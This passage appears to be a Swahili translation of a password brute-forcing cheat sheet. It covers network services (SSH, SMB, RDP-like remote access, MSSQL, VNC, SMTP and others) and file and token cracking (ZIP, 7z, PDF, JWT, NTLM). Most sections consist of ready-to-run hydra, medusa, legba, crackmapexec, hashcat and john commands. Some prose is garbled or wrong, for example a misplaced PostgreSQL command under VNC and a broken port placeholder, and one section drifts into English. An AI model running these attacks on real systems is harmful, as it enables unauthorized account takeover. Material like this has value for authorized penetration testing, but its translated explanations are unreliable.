Kwa sababu Rlogin inatumia uwakilishi wa wazi wa jina la mtumiaji na nenosiri, inaweza kuwa hatari ikiwa inatumika kwenye mtandao wa umma au usioaminika. Kwa hivyo, ni muhimu kuchukua tahadhari na kuhakikisha kuwa jina la mtumiaji na nenosiri ni salama na siri.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) ni itifaki ya mtandao ambayo inaruhusu mtumiaji kuingia kwenye kompyuta ya mbali na kutekeleza amri kutoka kwa umbali. Ni moja ya njia za kawaida za kudhibiti kompyuta kwa njia ya kijijini.

Kwa sababu ya udhaifu wake wa usalama, Rsh haipendekezwi kutumika kwenye mazingira ya uzalishaji. Hata hivyo, inaweza kuwa na matumizi katika mazingira ya majaribio au kwa madhumuni ya kujifunza.

Kwa sababu Rsh inatumia uwakilishi wa wazi wa nywila, inaweza kuwa rahisi kwa mtu mwenye nia mbaya kuvunja usalama na kupata ufikiaji usioidhinishwa kwenye kompyuta ya mbali. Kwa hiyo, ni muhimu kuchukua tahadhari na kuzingatia njia mbadala za kudhibiti kompyuta kwa njia ya kijijini ambazo ni salama zaidi.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync ni chombo cha kusawazisha data ambacho kinaweza kutumika kwa ufanisi katika shughuli za upelelezi. Inaruhusu mtumiaji kusawazisha faili na folda kati ya seva tofauti au kwenye mtandao. Kwa kutumia Rsync, unaweza kuchunguza mifumo ya kijijini na kubadilisha data kwa njia ya siri. Hii inaweza kuwa na manufaa katika kutekeleza mashambulizi ya nguvu kwa kutumia faili za msingi au kubadilisha data ya siri.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real-Time Streaming Protocol) ni itifaki ya mtandao inayotumiwa kwa usafirishaji wa data ya media kwa wakati halisi. Inaruhusu watumiaji kuungana na seva ya media na kucheza au kusambaza video na sauti kwa wakati halisi.

#### Kuvunja Nguvu ya RTSP

Kuvunja nguvu ya RTSP kunahusisha kujaribu kuingia kwenye seva ya RTSP kwa kutumia mbinu ya nguvu. Hapa kuna njia kadhaa za kufanya hivyo:

1. **Brute Force**: Kwa kutumia programu maalum, unaweza kujaribu kuingia kwenye seva ya RTSP kwa kujaribu nywila tofauti kwa njia ya kiotomatiki. Programu hizi zinaweza kufanya majaribio mengi kwa haraka, kwa matumaini ya kupata nywila sahihi.

2. **Dictionary Attack**: Badala ya kujaribu nywila zote zinazowezekana, unaweza kutumia orodha ya maneno ya kawaida au nywila zilizovuja kutoka kwa vyanzo vingine. Programu ya kuvunja nguvu inaweza kujaribu maneno haya kwa kasi ili kupata nywila sahihi.

3. **Rainbow Table Attack**: Hii ni mbinu ya kuvunja nguvu ambapo orodha ya hash zilizohifadhiwa za nywila zinatumika kwa kulinganisha na hash ya nywila iliyopatikana. Ikiwa kuna mechi, basi nywila sahihi imepatikana.

4. **Credential Stuffing**: Hii ni mbinu ambapo nywila na majina ya mtumiaji yaliyovuja kutoka kwa tovuti zingine hutumiwa kujaribu kuingia kwenye seva ya RTSP. Kwa sababu watu wengi hutumia nywila sawa kwa huduma tofauti, mbinu hii inaweza kuwa na mafanikio.

Ni muhimu kutambua kuwa kuvunja nguvu ya RTSP ni shughuli haramu na inaweza kusababisha mashtaka ya kisheria. Kwa hivyo, ni muhimu kufuata sheria na kufanya kazi ya kuvunja nguvu tu kwa idhini ya mmiliki wa seva.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol) ni itifaki salama ya kuhamisha faili kati ya seva na mteja. Inatumia usalama wa SSH (Secure Shell) kwa kusimba data inayotumwa kati ya seva na mteja. SFTP inatoa njia salama ya kuhamisha faili na kuzuia udukuzi na upotezaji wa data.

Kwa kufanya shambulio la Brute Force kwenye seva ya SFTP, unajaribu kuingia kwa kujaribu nywila tofauti hadi utakapopata nywila sahihi. Kuna njia kadhaa za kutekeleza shambulio la Brute Force kwenye SFTP, kama vile kutumia programu maalum za kushambulia, kutumia orodha ya maneno ya kawaida, au kutumia orodha ya maneno iliyopatikana kutoka kwa shambulio lingine la kuvuja data.

Kuna njia kadhaa za kujilinda dhidi ya shambulio la Brute Force kwenye SFTP. Moja ya njia hizo ni kuanzisha sera kali ya nywila, ambayo inahitaji nywila zenye nguvu na inazuia majaribio mengi ya kuingia. Pia, unaweza kufunga akaunti baada ya idadi fulani ya majaribio yasiyofanikiwa ya kuingia.

Ni muhimu kuzingatia kuwa kutekeleza shambulio la Brute Force kwenye seva ya SFTP ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Ni muhimu kufanya shambulio la Brute Force tu kwa idhini ya mmiliki wa seva na kwa madhumuni ya kujilinda na kuboresha usalama wa mfumo.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol) ni itifaki ya mtandao inayotumiwa kwa kusimamia na kuchunguza vifaa vya mtandao. Inaruhusu watumiaji kufuatilia hali ya vifaa vya mtandao, kama vile routers, switches, na seva. 

Kwa kawaida, SNMP hutumiwa kwa kusoma na kuandika data kutoka kwa vifaa vya mtandao. Inatumia mifano ya data inayoitwa MIBs (Management Information Bases) ambazo zinaelezea data inayopatikana kwenye vifaa vya mtandao. 

Kwa wadukuzi, SNMP inaweza kuwa njia ya kuvunja usalama wa mtandao. Wanaweza kutumia mbinu za kubadilisha au kusoma data ya vifaa vya mtandao kwa kutumia maneno ya siri yaliyodukuliwa au kwa kufanya mashambulizi ya nguvu kama vile Brute Force. 

Kwa hiyo, ni muhimu kwa wataalamu wa usalama kuchunguza na kuzuia mashambulizi ya SNMP kwa kufuatilia na kusasisha maneno ya siri, kudhibiti ufikiaji wa vifaa vya mtandao, na kufunga mifumo ya usalama inayofaa.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) ni itifaki ya mtandao inayotumiwa kwa kushirikiana na kushirikisha faili, vifaa vya uchapishaji, na huduma zingine kwenye mtandao. Ni itifaki ya msingi ya mfumo wa uendeshaji wa Windows.

#### Brute Force kwenye SMB

Brute force ni mbinu ya kujaribu kila uwezekano wa nywila hadi kupata ile sahihi. Kwenye SMB, brute force inaweza kutumika kujaribu kuingia kwenye akaunti za mtumiaji kwa kujaribu nywila tofauti.

Kuna zana nyingi zinazopatikana kwa ajili ya kutekeleza mashambulizi ya brute force kwenye SMB. Zana hizi zinaweza kujaribu nywila tofauti kwa kasi kubwa, ikirahisisha mchakato wa kuvunja nywila.

Ni muhimu kutambua kuwa kutekeleza mashambulizi ya brute force kwenye SMB ni kinyume cha sheria na inaweza kusababisha matokeo mabaya. Ni muhimu kufuata sheria na kufanya uchunguzi wa kimaadili wakati wa kufanya majaribio ya kuvunja nywila.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) ni itifaki ya mtandao inayotumiwa kwa usafirishaji wa barua pepe kati ya seva za barua pepe. Ni njia ya kawaida ya kuwasilisha barua pepe kwenye seva ya barua pepe ya mpokeaji.

SMTP inaruhusu watumiaji kutuma barua pepe kwa kutumia programu ya barua pepe au huduma ya barua pepe. Inafanya kazi kwa kuunganisha kwenye seva ya barua pepe ya mtumaji na kisha kuwasilisha barua pepe kwa seva ya barua pepe ya mpokeaji.

Kwa kawaida, SMTP inatumia bandari ya 25 kwa mawasiliano yake. Hata hivyo, kuna pia bandari zingine zinazotumiwa kama bandari ya 587 (SMTPS) kwa mawasiliano salama.

Kwa sababu SMTP ni itifaki ya wazi, inaweza kuchunguzwa na kudukuliwa. Kwa hiyo, ni muhimu kutekeleza hatua za usalama kama vile kudhibiti ufikiaji, kuthibitisha watumiaji, na kudhibiti trafiki ya barua pepe ili kuzuia mashambulizi ya brute force na udukuzi.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS ni itifaki ya mtandao inayotumiwa kwa kusudi la kuwezesha mawasiliano salama na ya siri kati ya mtumiaji na seva. Inaruhusu mtumiaji kuficha anwani yake ya IP halisi na kufanya uhusiano kupitia seva ya proxy. Hii inaweza kuwa na manufaa katika kuzuia ufuatiliaji na kuficha shughuli za mtumiaji.

Kwa kufanya hivyo, SOCKS inaruhusu mtumiaji kufanya uhusiano kupitia seva ya proxy ambayo inawakilisha mtumiaji kwa seva ya marudio. Hii inamaanisha kuwa seva ya marudio haijui anwani ya IP halisi ya mtumiaji, lakini badala yake inaona anwani ya IP ya seva ya proxy.

SOCKS inaweza kutumika kwa njia mbalimbali, ikiwa ni pamoja na kuficha anwani ya IP, kuvuka vizuizi vya mtandao, na kufikia rasilimali zilizozuiliwa. Ni muhimu kutambua kuwa SOCKS pekee haiwezi kutoa usalama kamili, na inashauriwa kutumia njia zingine za kujilinda mtandaoni kama vile kutumia VPN au Tor.

Kuna matoleo tofauti ya SOCKS, kama vile SOCKS4 na SOCKS5. SOCKS5 ni toleo la hivi karibuni na linaleta sifa za ziada kama vile uthibitishaji wa mtumiaji na uhamishaji wa data salama. Ni muhimu kuchagua toleo sahihi la SOCKS kulingana na mahitaji yako na mazingira ya mtandao unayotumia.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server ni mfumo wa usimamizi wa database uliotengenezwa na Microsoft. Inatumika sana katika maombi ya biashara na wavuti. SQL Server inasaidia lugha ya SQL (Structured Query Language) kwa kuuliza na kusimamia data.

#### Kuvunja Nguvu (Brute Force) kwenye SQL Server

Kuvunja Nguvu (Brute Force) ni mbinu ya kujaribu kila uwezekano wa nywila hadi kupata nywila sahihi. Kwa kuvunja nguvu kwenye SQL Server, unaweza kujaribu kuingia kwenye akaunti ya mtumiaji kwa kujaribu nywila tofauti.

Kuna njia kadhaa za kutekeleza kuvunja nguvu kwenye SQL Server, kama vile:

1. Dictionary Attack: Kuvunja nguvu kwa kutumia orodha ya maneno ya kawaida au nywila zilizopatikana hapo awali.
2. Brute Force Attack: Kuvunja nguvu kwa kujaribu kila uwezekano wa nywila, kuanzia na nywila fupi hadi nywila ndefu.
3. Hybrid Attack: Kuvunja nguvu kwa kuchanganya dictionary attack na brute force attack.

Kwa kutekeleza kuvunja nguvu kwenye SQL Server, unaweza kutumia zana kama SQLMap, Hydra, au Burp Suite. Hizi zana zinaweza kusaidia kugundua nywila za dhaifu na kujaribu kuvunja nguvu akaunti za mtumiaji.

Ni muhimu kutambua kuwa kuvunja nguvu kwenye SQL Server ni shughuli haramu na inaweza kusababisha masuala ya kisheria. Kwa hivyo, ni muhimu kufuata sheria na kanuni zinazohusiana na uhalifu wa mtandao katika eneo lako.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) ni itifaki ya mtandao inayotumika kwa usalama katika mawasiliano ya kompyuta. Inaruhusu watumiaji kuingia kwa mbali kwenye kompyuta au seva na kufanya operesheni za kijijini. SSH hutumia njia salama ya kusimba data na kuthibitisha utambulisho wa watumiaji.

#### Brute Force kwenye SSH

Brute force ni mbinu ya kuvunja ulinzi kwa kujaribu kila uwezekano wa nywila hadi kupata ile sahihi. Katika kesi ya SSH, brute force inahusisha kujaribu nywila tofauti kwa kuingia kwa nguvu kwenye seva ya SSH.

Kuna njia kadhaa za kutekeleza brute force kwenye SSH, kama vile:

- **Dictionary Attack**: Kwa kutumia orodha ya maneno ya kawaida au nywila zilizovuja, mshambuliaji anajaribu kila neno moja baada ya lingine hadi kupata nywila sahihi.
- **Brute Force Attack**: Mshambuliaji anajaribu kila uwezekano wa nywila, kuanzia na nywila fupi hadi nywila ndefu, kwa kutumia taratibu za kiotomatiki.
- **Hybrid Attack**: Mchanganyiko wa dictionary attack na brute force attack, ambapo mshambuliaji anajaribu kwanza orodha ya maneno ya kawaida kabla ya kuingia kwenye brute force.

Kuzuia mashambulizi ya brute force kwenye SSH, ni muhimu kuchukua hatua za usalama kama vile:

- Kutumia nywila zenye nguvu na ndefu.
- Kuzuia kuingia kwa nguvu kwa kufunga akaunti baada ya idadi fulani ya majaribio yasiyofanikiwa.
- Kuanzisha ufunguo wa SSH badala ya kutegemea nywila pekee.
- Kusasisha programu za SSH mara kwa mara ili kuepuka udhaifu uliojulikana.

Kwa kuzingatia hatua za usalama hizi, unaweza kuzuia mashambulizi ya brute force kwenye SSH na kuimarisha usalama wa mfumo wako.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Funguo dhaifu za SSH / Debian PRNG inayoweza kutabirika

Baadhi ya mifumo ina kasoro inayojulikana katika mbegu ya nasibu iliyotumika kuzalisha vifaa vya kryptographia. Hii inaweza kusababisha nafasi ndogo sana ya funguo ambayo inaweza kuvunjwa kwa kutumia zana kama vile [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pia kuna seti za funguo dhaifu zilizotangulia zilizopo kama vile [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ na OpenMQ)

Itifaki ya maandishi ya STOMP ni itifaki ya ujumbe inayotumiwa sana ambayo **inaruhusu mawasiliano na mwingiliano bila kukwama na huduma maarufu za foleni za ujumbe** kama vile RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia iliyosanifishwa na yenye ufanisi ya kubadilishana ujumbe na kutekeleza shughuli mbalimbali za ujumbe.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet ni itifaki ya mtandao inayotumika kwa mawasiliano ya kiwango cha chini kati ya vifaa vya mtandao. Inaruhusu mtumiaji kuunganisha na kudhibiti kifaa kingine kwa kutumia amri za maandishi. Kwa wadukuzi, Telnet inaweza kutumika kwa njia ya kuvamia kwa kujaribu kuingia kwa nguvu kwa kutumia maneno ya siri yaliyotabiriwa au kwa kutafuta maneno ya siri yaliyovuja. Hii inaweza kufanywa kwa kutumia programu maalum za kuvunja nguvu au kwa kujaribu maneno ya siri yaliyochaguliwa kwa mkono. Kwa kuwa Telnet haifanyi usimbuaji wa data, maelezo yote yanayopitishwa kupitia itifaki hii yanaweza kusomwa na kubadilishwa na mtu wa tatu.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) ni mfumo wa kudhibiti kompyuta kijijini ambao huruhusu mtumiaji kuona na kudhibiti kompyuta nyingine kupitia mtandao. Kwa kawaida, VNC hutumia bandari 5900 kwa mawasiliano.

#### Kuvunja Nguvu ya VNC

Kuvunja nguvu ya VNC ni mchakato wa kujaribu kuingia kwenye akaunti ya VNC kwa kujaribu idadi kubwa ya maneno ya siri hadi neno sahihi litakapopatikana. Hii inaweza kufanywa kwa kutumia programu maalum za kuvunja nguvu kama vile Hydra au Medusa.

Kuna njia kadhaa za kuboresha ufanisi wa kuvunja nguvu ya VNC:

1. **Kutumia orodha ya maneno ya siri iliyoboreshwa**: Kwa kutumia orodha ya maneno ya siri iliyoboreshwa, unaweza kuongeza nafasi ya kupata neno sahihi haraka zaidi.

2. **Kutumia teknolojia ya GPU**: GPU (Graphics Processing Unit) inaweza kutumika kwa kasi kubwa katika kuvunja nguvu ya VNC. Programu kama Hashcat zinaweza kutumika kwa kusaidia GPU katika mchakato huu.

3. **Kutumia vifaa vingi**: Kwa kutumia vifaa vingi vya kompyuta, unaweza kugawanya mzigo wa kuvunja nguvu na hivyo kuongeza kasi ya mchakato.

Ni muhimu kuzingatia kuwa kuvunja nguvu ya VNC bila idhini ya mmiliki wa akaunti ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Kwa hivyo, ni muhimu kufuata sheria na kanuni zinazohusiana na matumizi ya VNC na kuvunja nguvu.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm ni itifaki ya usimamizi wa mbali inayotumiwa kwenye mfumo wa Windows. Inaruhusu watumiaji kudhibiti na kusimamia kompyuta za Windows kutoka kwa kifaa kingine kwenye mtandao. Kwa kawaida, Winrm hutumiwa kwa madhumuni ya utawala wa mbali, kama vile kusanidi mipangilio, kufanya matengenezo, na kutekeleza amri kwenye kompyuta za Windows.

Kwa sababu Winrm inaruhusu upatikanaji wa mbali kwenye kompyuta za Windows, inaweza kutumiwa kama njia ya kuvunja mfumo wa usalama. Mojawapo ya mbinu maarufu ya kuvunja mfumo wa Winrm ni kwa kutumia mbinu ya "brute force".

Mbinu ya "brute force" inahusisha kujaribu kila uwezekano wa nywila hadi kupata ile sahihi. Kwa kufanya hivyo, hacker anaweza kujaribu nywila tofauti kwa kutumia programu maalum au skrini ya kuingia. Kwa kawaida, mbinu hii inahitaji muda mrefu na rasilimali nyingi, lakini inaweza kuwa na mafanikio ikiwa nywila ni dhaifu au rahisi kuhifadhiwa.

Kwa kuzuia mashambulizi ya "brute force" kwenye Winrm, ni muhimu kutekeleza hatua za usalama kama vile kuzuia upatikanaji wa kijijini, kuanzisha sera kali za nywila, na kufuatilia shughuli za kuingia kwenye mfumo. Pia, ni muhimu kuhakikisha kuwa nywila zinazotumiwa ni ngumu na zimehifadhiwa kwa usalama.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii ya **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Mahali

### Maktaba za kuvunja mtandao

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 na/au bila ESS/SSP na na thamani yoyote ya changamoto)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, na nyaraka za MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes na hash za faili)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Angalia hii kabla ya kujaribu kuvunja nguvu Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Shambulizi la zip ya maandishi yanayojulikana

Unahitaji kujua **maandishi ya wazi** (au sehemu ya maandishi ya wazi) **ya faili iliyomo ndani** ya zip iliyofichwa. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizomo ndani** ya zip iliyofichwa kwa kufanya: **`7z l encrypted.zip`**\
Pakua [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) kutoka ukurasa wa matoleo.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z ni programu ya kubana na kubana faili ambayo inasaidia algorithms mbalimbali za kubana. Inaweza kutumika kwa ufanisi kubana na kubana faili za aina tofauti, kama vile faili za maandishi, picha, na video. 7z ina interface ya amri ambayo inaruhusu watumiaji kufanya shughuli za kubana na kubana kutoka kwa terminal.

Kwa kawaida, 7z hutumiwa kwa madhumuni ya kubana faili ili kupunguza ukubwa wao na kuokoa nafasi ya diski. Inaweza pia kutumika kwa madhumuni ya usalama kwa kubana faili na kuiweka salama na nywila. Kwa kuongezea, 7z inaweza kutumika kwa ufanisi katika mchakato wa uchunguzi wa data kwa kubana faili za uchunguzi na kuzifanya zisomeke na kusambazwa kwa urahisi.

Kwa kutumia 7z, unaweza kubana faili kwa kutumia algorithms tofauti za kubana kama LZMA, LZMA2, na PPMd. Unaweza pia kubana faili kwa viwango tofauti vya kubana, kama vile kiwango cha juu cha kubana ambacho kinatoa kubana bora lakini inachukua muda mrefu zaidi, au kiwango cha chini cha kubana ambacho kinatoa kubana haraka lakini inatoa ubora wa chini wa kubana.

Kwa kumalizia, 7z ni chombo muhimu katika mchakato wa kubana na kubana faili. Inatoa njia rahisi na yenye nguvu ya kubana faili za aina tofauti na inaweza kutumika kwa madhumuni mbalimbali, kama vile kuokoa nafasi ya diski, kuhifadhi faili salama, na kufanya uchunguzi wa data.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

#### Brute Force

Brute force is a common hacking technique used to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords until the correct one is found. It is a time-consuming method that relies on the assumption that the password is weak and can be easily guessed.

To perform a brute force attack, hackers use automated tools that generate and test a large number of password combinations. These tools can be customized to target specific systems or accounts, increasing the chances of success.

There are several types of brute force attacks, including:

1. **Simple Brute Force**: This method involves trying all possible combinations of characters, starting from the shortest to the longest password length. It is the most basic form of brute force attack.

2. **Dictionary Attack**: In this type of attack, hackers use a pre-defined list of commonly used passwords or words from a dictionary to guess the password. This method is more efficient than simple brute force as it reduces the number of possible combinations.

3. **Hybrid Attack**: A hybrid attack combines elements of both brute force and dictionary attacks. It uses a combination of pre-defined words and characters to guess the password.

4. **Credential Stuffing**: This technique involves using a list of stolen usernames and passwords from one website or service and trying them on other websites or services. It relies on the fact that many users reuse the same credentials across multiple platforms.

To protect against brute force attacks, it is important to use strong and unique passwords that are not easily guessable. Additionally, implementing account lockouts, CAPTCHA, and rate limiting can help prevent automated brute force attacks.

#### References

- [OWASP Brute Force](https://owasp.org/www-community/attacks/Brute_force_attack)
- [Wikipedia - Brute-force attack](https://en.wikipedia.org/wiki/Brute-force_attack)
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Nenosiri la Mmiliki wa PDF

Ili kuvunja nenosiri la mmiliki wa PDF angalia hapa: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Kuvunja NTLM

NTLM ni itifaki ya uwakilishi wa nywila ya Windows ambayo inatumika kwa uwakilishi wa nywila za mtumiaji kwenye mfumo wa Windows. Kuvunja NTLM kunahusisha kujaribu kubaini nywila sahihi kwa kutumia jaribio la nguvu.

Kuna njia kadhaa za kuvunja NTLM, ikiwa ni pamoja na:

1. **Dictionary Attack**: Kuvunja kwa kutumia orodha ya maneno ya kawaida au nywila zilizopatikana hapo awali.

2. **Brute Force Attack**: Kuvunja kwa kujaribu kila kombinasi iwezekanayo ya herufi, nambari, na alama hadi kupatikana kwa nywila sahihi.

3. **Rainbow Table Attack**: Kuvunja kwa kutumia meza ya upinde wa mvua, ambayo ni orodha ya hash za nywila zilizopatikana hapo awali na zinazolingana na hash ya nywila inayolengwa.

4. **Pass the Hash Attack**: Kuvunja kwa kutumia hash ya nywila iliyopatikana hapo awali badala ya nywila halisi.

Kwa kuvunja NTLM, ni muhimu kuzingatia muda unaohitajika kwa kila jaribio na kuepuka kugunduliwa na mfumo wa ulinzi. Matumizi ya vifaa vya kuharakisha kama vile GPU au FPGA yanaweza kusaidia kuharakisha mchakato wa kuvunja.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass ni programu ya usimamizi wa nenosiri ambayo inaruhusu watumiaji kuhifadhi na kusimamia nenosiri zao kwa njia salama. Programu hii inatumia teknolojia ya kuchanganya nenosiri (master password) na ufunguo wa kufungua faili (file key) ili kuhakikisha usalama wa data. 

Kwa kawaida, watumiaji huingiza nenosiri la msingi (master password) ili kupata ufikiaji wa nenosiri zilizohifadhiwa. Hii inazuia watu wengine wasioidhinishwa kufikia na kutumia nenosiri hizo. 

